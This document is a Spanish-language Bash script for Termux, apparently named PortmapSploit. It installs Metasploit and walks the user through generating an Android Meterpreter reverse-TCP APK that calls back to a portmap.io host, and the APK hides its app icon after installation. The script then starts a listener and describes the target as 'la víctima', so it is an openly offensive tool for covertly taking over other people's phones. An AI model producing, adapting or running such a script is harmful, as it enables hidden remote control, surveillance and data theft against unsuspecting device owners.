#!/data/data/com.termux/files/usr/bin/bash
#
# Created by: Termux Hacking
#
# PortmapSploit
#
# VARIABLES
#
source $HOME/PortmapSploit/Colors.sh
#
# FUNCIONES
#
function BannerVerde {
echo -e ${verde}"
          +hydNNNNdyh+
        +mMMMMMMMMMMMMm+
      'dMMm${blanco}:${verde}NMMMMMMN${blanco}:${verde}mMMd'
      hMMMMMMMMMMMMMMMMMMh
  ..  yyyyyyyyyyyyyyyyyyyy  ..
.mMMm'MMMMMMMMMMMMMMMMMMMM'mMMm.
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
-MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM-
 +yy+ MMMMMMMMMMMMMMMMMMMM +yy+
      mMMMMMMMMMMMMMMMMMMm
      '/++MMMMh++hMMMM++/'
          MMMMo  oMMMM
          MMMMo  oMMMM
          oNMm-  -mMNs
"
}

function BannerAzul {
echo -e "${verde}
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMM                MMMMMMMMMM
MMMNb                           vMMMM
MMMNl  ${blanco}MMMMM             MMMMM${verde}  JMMMM
MMMNl  ${blanco}MMMMMMMN       NMMMMMMM${verde}  JMMMM
MMMNl  ${blanco}MMMMMMMMMNmmmNMMMMMMMMM${verde}  JMMMM
MMMNI  ${blanco}MMMMMMMMMMMMMMMMMMMMMMM${verde}  jMMMM
MMMNI  ${blanco}MMMMMMMMMMMMMMMMMMMMMMM${verde}  jMMMM
MMMNI  ${blanco}MMMMM   MMMMMMM   MMMMM${verde}  jMMMM
MMMNI  ${blanco}MMMMM   MMMMMMM   MMMMM${verde}  jMMMM
MMMNI  ${blanco}MMMNM   MMMMMMM   MMMMM${verde}  jMMMM
MMMNI  ${blanco}WMMMM   MMMMMMM   MMMM#${verde}  JMMMM
MMMMR  ${blanco}?MMNM             MMMMM${verde} .dMMMM
MMMMNm  ${blanco}?MMM             MMMM${verde}  dMMMMM
MMMMMMN  ${blanco}?MM             MM?${verde}  NMMMMMN
MMMMMMMMNe                 JMMMMMNMMM
MMMMMMMMMMNm,            eMMMMMNMMNMM
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
"
}

function BannerRojo {
echo -e ${rojo}"
      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.${blanco}MMMM${rojo}.oOOOOoOOOOl.${blanco}MMMM${rojo},OOOOOOOOo
  dOOOOOOOO.${blanco}MMMMMM${rojo}.cOOOOOc.${blanco}MMMMMM${rojo},OOOOOOOOx
  lOOOOOOOO.${blanco}MMMMMMMMM${rojo};d;${blanco}MMMMMMMMM${rojo},OOOOOOOOl
  .OOOOOOOO.${blanco}MMM${rojo}.;${blanco}MMMMMMMMMMM${rojo};${blanco}MMMM${rojo},OOOOOOOO.
   cOOOOOOO.${blanco}MMM${rojo}.OOc.${blanco}MMMMM${rojo}'oOO.${blanco}MMM${rojo},OOOOOOOc
    oOOOOOO.${blanco}MMM${rojo}.OOOO.${blanco}MMM${rojo}:OOOO.${blanco}MMM${rojo},OOOOOOo
     lOOOOO.${blanco}MMM${rojo}.OOOO.${blanco}MMM${rojo}:OOOO.${blanco}MMM${rojo},OOOOOl
      ;OOOO'${blanco}MMM${rojo}.OOOO.${blanco}MMM${rojo}:OOOO.${blanco}MMM${rojo};OOOO;
       .dOOo'${blanco}WM${rojo}.OOOOocccxOOOO.${blanco}MX${rojo}'xOOd.
         ,kOl'${blanco}M${rojo}.OOOOOOOOOOOOO.${blanco}M${rojo}'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .
"
}
#
# CÓDIGO  ┃   █   ═  └   ┘  ┌   ┐
#
sleep 0.5
clear
echo -e "${verde}
┌══════════════════════════════┐
█ ${blanco}ACTUALIZANDO REPOSITORIOS... ${verde}█
└══════════════════════════════┘
"${blanco}
apt update && apt upgrade -y
sleep 0.5
clear
while :
do
BannerAzul
echo -e -n "${verde}
┌═══════════════════════════════════┐
█ ${blanco}SE INSTALARÁ METASPLOIT-FRAMEWORK ${verde}█
█   ${blanco}SELECCIONE SU VERSIÓN ANDROID   ${verde}█
└═══════════════════════════════════┘

┌═══════════════════════════┐
█ [${blanco}1${verde}] ┃ ${blanco}5.0.1 - 6.0.1       ${verde}█
█═══════════════════════════█
█ [${blanco}2${verde}] ┃ ${blanco}7.0.1 - SUPERIOR    ${verde}█
█═══════════════════════════█
█ [${blanco}3${verde}] ┃ ${blanco}OMITIR INSTALACIÓN  ${verde}█
└═══════════════════════════┘
┃
└═>>> "${blanco}

read -r opcion
[ "$opcion" == "1" ]||[ "$opcion" == "2" ]||[ "$opcion" == "3" ] && break
echo -e "${rojo}
┌═════════════════════┐
█ ${blanco}¡OPCIÓN INCORRECTA! ${rojo}█
└═════════════════════┘
"
sleep 2
clear
done
case $opcion in
	1)
		sleep 0.5
echo -e "${verde}
┌════════════════════════════════════┐
█ ${blanco}INSTALANDO METASPLOIT-FRAMEWORK... ${verde}█
└════════════════════════════════════┘
"${blanco}
		pkg install -y curl > /dev/null 2>&1
		pkg install ruby -y > /dev/null 2>&1
		gem install bundler:1.17.3
		curl -LO https://github.com/termux/termux-packages/files/3995119/metasploit_5.0.65-1_all.deb.gz
		gunzip metasploit_5.0.65-1_all.deb.gz
		dpkg -i metasploit_5.0.65-1_all.deb
		apt install -f -y
echo -e "${verde}
┌════════════════════════════════┐
█ ${blanco}METASPLOIT-FRAMEWORK INSTALADO ${verde}█
└════════════════════════════════┘
"${blanco}
		sleep 2
		clear
		;;
	2)
		sleep 0.5
echo -e "${verde}
┌════════════════════════════════════┐
█ ${blanco}INSTALANDO METASPLOIT-FRAMEWORK... ${verde}█
└════════════════════════════════════┘
"${blanco}
		pkg install -y unstable-repo > /dev/null 2>&1
		pkg install -y metasploit
echo -e "${verde}
┌════════════════════════════════┐
█ ${blanco}METASPLOIT-FRAMEWORK INSTALADO ${verde}█
└════════════════════════════════┘
"${blanco}
		sleep 2
		clear
		;;
	3)
		sleep 0.5
		clear
esac

while :
do
BannerRojo
echo -e -n "${verde}
┌════════════════════════════┐
█ ${blanco}¿QUIERES CREAR UN PAYLOAD  ${verde}█
█ ${blanco}PARA DISPOSITIVOS ANDROID? ${verde}█
└════════════════════════════┘

┌═════════════════┐
█ [${blanco}1${verde}] ┃    ${blanco}SI     ${verde}█
█═════════════════█
█ [${blanco}2${verde}] ┃    ${blanco}NO     ${verde}█
└═════════════════┘
┃
└═>>> "${blanco}
read -r respuesta
[ "$respuesta" == "1" ]||[ "$respuesta" == "2" ] && break
echo -e "${rojo}
┌═════════════════════┐
█ ${blanco}¡OPCIÓN INCORRECTA! ${rojo}█
└═════════════════════┘
"
sleep 2
clear
done
case $respuesta in
	1)
		sleep 0.5
		clear
echo -e -n "${verde}
┌═══════════════════════════════════┐
█ ${blanco}ESCRIBA EL NOMBRE PARA SU PAYLOAD ${verde}█
└═══════════════════════════════════┘
┃    ┌════════════════════════════════════┐
└═>>>█ EJEMPLO >>> ${blanco}PayLoad ${rojo}(SIN ESPACIOS) ${verde}█
┃    └════════════════════════════════════┘
┃
└═>>> "${blanco}

		read -r nombre
		sleep 0.5
echo -e -n "${verde}
┌════════════════════════════┐
█ ${blanco}ESCRIBA EL HOST DE PORTMAP ${verde}█
└════════════════════════════┘
┃    ┌════════════════════════════════════════════┐
└═>>>█ EJEMPLO >>> ${blanco}termuxhacking-56371.portmap.io ${verde}█
┃    └════════════════════════════════════════════┘
┃
└═>>> "${blanco}

		read -r host
		sleep 0.5
echo -e -n "${verde}
┌════════════════════════════┐
█ ${blanco}ESCRIBA EL PORT DE PORTMAP ${verde}█
└════════════════════════════┘
┃    ┌═══════════════════┐
└═>>>█ EJEMPLO >>> ${blanco}56371 ${verde}█
┃    └═══════════════════┘
┃
└═>>> "${blanco}
		read -r port
		sleep 0.5
echo -e -n "${verde}
┌═════════════════════════┐
█ ${blanco}ESCRIBA SU PUERTO LOCAL ${verde}█
└═════════════════════════┘
┃    ┌══════════════════┐
└═>>>█ EJEMPLO >>> ${blanco}8080 ${verde}█
┃    └══════════════════┘
┃
└═>>> "${blanco}
		read -r puerto
		sleep 0.5
echo -e -n "${verde}
┌════════════════════════┐
█ ${blanco}ESCRIBIR LA RUTA DONDE ${verde}█
█ ${blanco}SE GUARDARÁ SU PAYLOAD ${verde}█
└════════════════════════┘
┃    ┌══════════════════════════════┐
└═>>>█ EJEMPLO >>> ${blanco}/sdcard/Download ${verde}█
┃    └══════════════════════════════┘
┃
└═>>> "${blanco}
		read -r ruta
		sleep 0.5
echo -e "${verde}
┌══════════════════════┐
█ ${blanco}GENERANDO PAYLOAD... ${verde}█
└══════════════════════┘
"
		msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port AndroidHideAppIcon=true AndroidMeterpreterDebug=true AndroidWakelock=true -o $ruta/$nombre.apk
		sleep 2
		clear
		BannerVerde
echo -e "${verde}
┌════════════════════════════════┐
█ ${blanco}PAYLOAD GENERADO CORRECTAMENTE ${verde}█
█   ${blanco}REVISAR LA MEMORIA INTERNA   ${verde}█
└════════════════════════════════┘
┌════════════════════════════════┐
█ ${blanco}EL PAYLOAD GENERADO DESAPARECE ${verde}█
█  ${blanco}DE LA PANTALLA PRINCIPAL DEL  ${verde}█
█   ${blanco}DISPOSITIVO DE LA VÍCTIMA    ${verde}█
█     ${blanco}DENTRO DE 10 SEGUNDOS      ${verde}█
█   ${blanco}DESPUÉS DE SU INSTALACIÓN    ${verde}█
█     ${blanco}POR FAVOR NO CANCELAR      ${verde}█
█  ${blanco}EL PROCESO DE LA HERRAMIENTA  ${verde}█
█     ${blanco}SE INICIARÁ LA CONSOLA     ${verde}█
█   ${blanco}DE METASPLOIT FRAMEWORK...   ${verde}█
└════════════════════════════════┘
┃
┃    ┌═══════════════════════════════┐
└═>>>█ ${blanco}INTERACTUANDO A LA VÍCTIMA... ${verde}█
     └═══════════════════════════════┘
"${blanco}
		msfconsole -q -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set lhost $host;set lport $puerto;exploit"
		;;
	2)
		sleep 0.5
		clear
		BannerVerde
echo -e "${verde}
┌════════════════════════════════════════┐
█ ${blanco}PARA USAR NUEVAMENTE EL SCRIPT EJECUTE ${verde}█
█     ${blanco}EL COMANDO ./PortmapSploit.sh      ${verde}█
└════════════════════════════════════════┘
"${blanco}
esac
